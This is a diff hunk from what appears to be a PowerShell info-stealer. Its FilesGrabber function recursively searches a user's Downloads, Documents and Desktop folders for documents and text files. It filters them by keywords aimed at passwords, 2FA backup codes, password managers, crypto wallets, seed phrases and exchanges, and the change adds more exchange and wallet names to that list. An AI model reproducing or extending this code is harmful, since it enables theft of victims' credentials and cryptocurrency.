@@ -756,7 +756,7 @@ Pass: $decodedPass
 
     function FilesGrabber {
     $allowedExtensions = @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log")
-    $keywords = @("2fa","atomic wallet","account","backup","bank","bitcoin","btc","backupcode","bitwarden","bitcoin","code","coinbase","crypto","dashlane","discord","eth","exodus","facebook","funds","keepass","keepassxc","keys","lastpass","login","mail","memo","metamask","note","nordpass","pass","paypal","private","pw","recovery","remote","secret","passphrase","seedphrase","wallet seed","server","syncthing","smart contract","trading","token","wallet")
+    $keywords = @("2fa", "atomic wallet", "account", "backup", "bank", "bitcoin", "binance", "btc", "backupcode", "bitwarden", "code", "coinbase", "crypto", "dashlane", "discord", "eth", "exodus", "facebook", "funds", "kraken", "kucoin", "keepass", "keepassxc", "keys", "lastpass", "login", "ledger", "mail", "memo", "metamask", "note", "nordpass", "pass", "paypal", "private", "pw", "recovery", "remote", "secret", "passphrase", "seedphrase", "wallet seed", "server", "solana", "syncthing", "smart contract", "trading", "token", "tether", "wallet")
     $paths = @("$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop")
     foreach ($path in $paths) {
         $files = Get-ChildItem -Path $path -Recurse -Include $allowedExtensions | Where-Object {
